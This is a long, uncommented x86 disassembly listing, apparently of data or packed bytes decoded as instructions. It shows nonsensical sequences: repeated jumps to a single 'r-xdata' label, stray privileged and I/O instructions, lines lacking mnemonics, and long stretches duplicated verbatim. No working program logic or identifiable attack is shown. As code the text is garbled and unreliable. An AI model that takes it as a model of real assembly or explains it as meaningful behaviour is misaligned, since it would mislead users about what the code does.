sbb [ 0xfffffffff08b06f2 ] 0xffffffab
xchg edx eax
aad 0x92
test [ ebx + ebp * 8 - 0xde21415 ] al
jge r-xdata
sbb eax 0x19928dfe
dec ebp
jpo r-xdata
dec edi
and [ 0xfffffffff07326f2 ] bl
xchg esp eax
and al 0x96
sub al 0x92
lds esi [ ecx + 0x7b ]
jpo r-xdata
jmp r-xdata
movsd [ edi ] [ esi ]
xchg edx eax
or edx [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jmp r-xdata
jg r-xdata
inc eax
cmp al 0x7f
jpo r-xdata
pop edi
outsd
cmpsb [ esi ] [ edi ]
movsb [ edi ] [ esi ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
outsd
je r-xdata
idiv dh
daa
xchg [ esp + eax * 4 + 0x7dbc922b ] al
jpo r-xdata
sbb eax 0x743d3842
[ edi ]
jmp r-xdata
jpo r-xdata
adc edi [ edi + 0x7a ]
sub_47953f
and ebx [ 0x488d3ef2 ]
mov ebx 0x8a923f11
push edi
jpo r-xdata
jmp r-xdata
jmp r-xdata
sub eax [ eax - 0x48 ]
xchg edx eax
loope r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop [ esp + eax * 4 - 0x7b66e96d ]
test al dh
mov edx [ edx - 0x7b7b79c4 ]
jmp j_sub_4795cb
jmp r-xdata
test [ edx - 0x7b7b5be4 ] dl
sub edx [ ecx ]
jpo r-xdata
jmp r-xdata
jo r-xdata
std
cmpsd [ esi ] [ edi ]
sub dh dh
inc [ ebx ]
xchg [ esp + eax * 4 + 0x2c84282b ] al
dec ecx
cmpsb [ esi ] [ edi ]
test [ esp + esi * 2 + 0x7b5436f8 ] al
jpo r-xdata
sub [ edi + ecx + 0x6d93635f ] eax
dec eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
push ecx
0xebeb8484 0xcc84
mov bh 0x7b
jpo r-xdata
jpo r-xdata
aas
pop edi
je r-xdata
test [ esp + ecx * 8 + 0x7b7b7bbf ] 0x84871e92
test bl ch
jmp r-xdata
clc
mov edi 0xfb7b1377
jpo r-xdata
mov es [ esp + eax * 4 - 0x78c909d4 ]
sub al [ esi + ecx + 0x5462928f ]
jpo r-xdata
xchg edx esi
std
mov [ 0xffffffff927b7b7b ] eax
je r-xdata
xchg edx eax
test al 0x5c
jpo r-xdata
xchg [ ecx - 0x14147b7c ] eax
xchg edx eax
jle r-xdata
jmp r-xdata
push ds
xchg [ esp + eax * 4 + 0x3ebcebeb ] eax
mov bl 0x9
push ds
sub eax 0xb73ebc36
or al 0x1a
sub [ edi + ecx + 0x2d84635f ] al
setb [ edi - 0x14848488 ]
[ eax ] 0xffffffb2
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg ebx eax
cld
js r-xdata
jmp r-xdata
test [ ebx + ebp + 0x2b2c8428 ] al
test [ edx + edx * 4 - 0x7b7b6b19 ] al
jmp r-xdata
cmp ebp [ ebx ]
idiv dh
mov edi 0x2b848487
xchg edx eax
jge r-xdata
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
sub eax 0x78af920f
je r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc eax
mov eax 0x7b73e192
jpo r-xdata
sub [ eax ] ch
jmp r-xdata
retn
mov esp 0x1e23cf3e
adc eax 0xc33ebc2d
and ebx [ ss : esi ]
mov bh 0xc
sbb cl [ ecx ]
push ds
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
dec ebp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
or [ esi ] ebx
mov esp 0x1a0cb73e
jmp r-xdata
push [ ebx + 0x2c84848e ]
div [ esi ]
xchg [ edx ] ebp
test [ esi ] cl
mov bl 0x8e
test [ esp + ebp + 0x2a8736f6 ] al
mov ebx 0x8731f274
xor [ edi + 0x69923244 ] 0x51
jpo r-xdata
lds esi [ eax ]
and dh dh
mov [ ss : 0xffffffff923b112a ] eax
idiv dh
add eax [ esi + 0x282b8484 ]
test [ ebx + ebp ] ch
jmp r-xdata
jmp r-xdata
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
mov esp 0x2d15c73e
xchg ebx eax
jpo r-xdata
test bl ch
xchg ebx eax
r-xdata
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
xchg ebx eax
jmp r-xdata
push es
add [ ebp + ebp * 8 + 0x7b7b7bf7 ] 0xfffffffe
jge r-xdata
xchg ebx eax
mov ebx 0xebb8b225
jmp r-xdata
sub eax 0x7d933636
pop ebp
xchg ebx eax
mov ebx 0x3b848492
sub esi esi
jmp r-xdata
jpo r-xdata
in al dx
0x71928484 0x7b7d
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
jpo r-xdata
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
test [ ebx + edi - 0x400109d5 ] al
xchg [ esp + eax * 4 + 0x527d922b ] eax
jpo r-xdata
test [ edi ] cl
pop edi
arpl [ ebp + ebp + 0x78af920f ] ax
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
jpo r-xdata
sub eax 0x7bc7cbf0
xor ebx [ edi + 0x7b ]
jpo r-xdata
and ah [ edx ]
div [ esi ]
mov [ 0xffffffff923b112a ] eax
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
jpo r-xdata
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
jmp r-xdata
jmp r-xdata
jpo r-xdata
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
je r-xdata
jmp r-xdata
imul edi [ ebx + 0x7b ] 0xffffffeb
jpo r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
adc [ ecx ] esp
or al 0x7b
jpo r-xdata
adc [ edi ] edi
jmp r-xdata
push esi
jpo r-xdata
jae r-xdata
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_47956a
sbb eax 0x2dd336f2
div dh
test [ esi - 0x296d7b7c ] 0xeb7b7b76
sub esi eax
mov ebp 0x84968f93
test al bh
mov edi 0x5f07f86b
jpo r-xdata
xchg ebx eax
aas
pop edi
outsd
je r-xdata
jg r-xdata
sub al 0xf6
jpo r-xdata
xchg [ ss : edx ] ebp
test [ esi ] cl
sub al 0x84
sub eax 0x38cc7473
push edi
xchg edx eax
mov cl 0x97
test [ ebx + ebp * 8 - 0x6bdeec15 ] al
and al 0x96
sub al 0x92
lds esi [ ecx + 0x7b ]
jpo r-xdata
jmp r-xdata
jg r-xdata
inc eax
cmp al 0x7f
jpo r-xdata
pop edi
outsd
cmpsb [ esi ] [ edi ]
movsb [ edi ] [ esi ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
outsd
je r-xdata
idiv dh
daa
xchg [ esp + eax * 4 + 0x7dbc922b ] al
jpo r-xdata
sbb eax 0x743d3842
[ edi ]
jmp r-xdata
jpo r-xdata
adc edi [ edi + 0x7a ]
sub_479642
test [ esp + eax * 4 + 0x7b70c3c4 ] al
jpo r-xdata
jpo r-xdata
aas
pop edi
je r-xdata
clc
mov edi 0xfb7b1377
jpo r-xdata
xchg edx eax
jle r-xdata
push ds
xchg [ esp + eax * 4 + 0x3ebcebeb ] eax
mov bl 0x9
push ds
sub eax 0xb73ebc36
or al 0x1a
sub [ edi + ecx + 0x2d84635f ] al
setb [ edi - 0x14848488 ]
[ eax ] 0xffffffb2
mov eax 0xebebebeb
jmp r-xdata
jpo r-xdata
test [ ebx + ebp + 0x2b2c8428 ] al
test [ edx + edx * 4 - 0x7b7b6b19 ] al
jmp r-xdata
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
sub eax 0x78af920f
sub [ edi + ecx + 0x6d93635f ] eax
dec eax
jpo r-xdata
jpo r-xdata
inc eax
mov eax 0x7b73e192
jpo r-xdata
sub [ eax ] ch
jmp r-xdata
retn
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
dec ebp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
or [ esi ] ebx
mov esp 0x1a0cb73e
jmp r-xdata
test [ esp + ecx * 8 + 0x7b7b7bbf ] 0x84871e92
test bl ch
jmp r-xdata
mov es [ esp + eax * 4 - 0x78c909d4 ]
sub al [ esi + ecx + 0x5462928f ]
jpo r-xdata
xchg [ ecx - 0x14147b7c ] eax
xchg edx esi
std
mov [ 0xffffffff927b7b7b ] eax
idiv dh
add eax [ esi + 0x282b8484 ]
test [ ebx + ebp ] ch
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
mov esp 0x2d15c73e
xchg ebx eax
jge r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
jpo r-xdata
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
test [ ebx + edi - 0x400109d5 ] al
xchg [ esp + eax * 4 + 0x527d922b ] eax
jpo r-xdata
test [ edi ] cl
pop edi
arpl [ ebp + ebp + 0x78af920f ] ax
cmp ebp [ ebx ]
idiv dh
mov edi 0x2b848487
xchg edx eax
jge r-xdata
je r-xdata
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
mov esp 0x1e23cf3e
adc eax 0xc33ebc2d
and ebx [ ss : esi ]
mov bh 0xc
sbb cl [ ecx ]
push ds
jpo r-xdata
push [ ebx + 0x2c84848e ]
div [ esi ]
xchg [ edx ] ebp
test [ esi ] cl
mov bl 0x8e
test [ esp + ebp + 0x2a8736f6 ] al
jmp r-xdata
test bl ch
xchg ebx eax
r-xdata
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
in al dx
0x71928484 0x7b7d
jpo r-xdata
xchg ebx eax
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
jmp r-xdata
jpo r-xdata
mov ebx 0x8731f274
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
je r-xdata
jmp r-xdata
sub eax 0x7d933636
pop ebp
xchg ebx eax
mov ebx 0x3b848492
sub esi esi
imul edi [ ebx + 0x7b ] 0xffffffeb
jpo r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
adc [ ecx ] esp
or al 0x7b
jpo r-xdata
adc [ edi ] edi
jmp r-xdata
push esi
jpo r-xdata
jae r-xdata
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_479668
xchg ebx eax
xchg [ esp + eax * 4 - 0x7b141415 ] al
sub eax 0xb3fef64b
xchg [ esp + eax * 4 - 0x7b5be36e ] al
test [ ebx ] ch
adc [ ebx - 0xe ] edi
std
cmpsd [ esi ] [ edi ]
sub [ edi + ecx + 0x6d93635f ] eax
dec eax
jpo r-xdata
jpo r-xdata
test [ esp + ecx * 8 + 0x7b7b7bbf ] 0x84871e92
test bl ch
jmp r-xdata
clc
mov edi 0xfb7b1377
jpo r-xdata
mov es [ esp + eax * 4 - 0x78c909d4 ]
sub al [ esi + ecx + 0x5462928f ]
jpo r-xdata
xchg edx esi
std
mov [ 0xffffffff927b7b7b ] eax
xchg [ ecx - 0x14147b7c ] eax
jmp r-xdata
push ds
xchg [ esp + eax * 4 + 0x3ebcebeb ] eax
mov bl 0x9
push ds
sub eax 0xb73ebc36
or al 0x1a
sub [ edi + ecx + 0x2d84635f ] al
setb [ edi - 0x14848488 ]
[ eax ] 0xffffffb2
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
cmp ebp [ ebx ]
idiv dh
mov edi 0x2b848487
xchg edx eax
jge r-xdata
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
sub eax 0x78af920f
je r-xdata
mov esp 0x1e23cf3e
adc eax 0xc33ebc2d
and ebx [ ss : esi ]
mov bh 0xc
sbb cl [ ecx ]
push ds
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
dec ebp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
or [ esi ] ebx
mov esp 0x1a0cb73e
jmp r-xdata
push [ ebx + 0x2c84848e ]
div [ esi ]
xchg [ edx ] ebp
test [ esi ] cl
mov bl 0x8e
test [ esp + ebp + 0x2a8736f6 ] al
jmp r-xdata
jmp r-xdata
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
mov esp 0x2d15c73e
xchg ebx eax
jge r-xdata
jpo r-xdata
sub eax 0x7d933636
pop ebp
xchg ebx eax
mov ebx 0x3b848492
sub esi esi
jmp r-xdata
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
jpo r-xdata
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
test [ ebx + edi - 0x400109d5 ] al
xchg [ esp + eax * 4 + 0x527d922b ] eax
jpo r-xdata
test [ edi ] cl
pop edi
arpl [ ebp + ebp + 0x78af920f ] ax
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
jpo r-xdata
jmp r-xdata
test bl ch
xchg ebx eax
r-xdata
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
in al dx
0x71928484 0x7b7d
jpo r-xdata
xchg ebx eax
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
jmp r-xdata
jpo r-xdata
mov ebx 0x8731f274
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
je r-xdata
jmp r-xdata
imul edi [ ebx + 0x7b ] 0xffffffeb
jpo r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
adc [ ecx ] esp
or al 0x7b
jpo r-xdata
adc [ edi ] edi
jmp r-xdata
push esi
jpo r-xdata
jae r-xdata
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_4796bb
jmp r-xdata
jpe r-xdata
sub dl [ ecx ]
cmp edx [ edx + 0x7b7b5f33 ]
dec eax
jpo r-xdata
and ah [ edx ]
div [ esi ]
mov [ 0xffffffff923b112a ] eax
xor ebx [ edi + 0x7b ]
jpo r-xdata
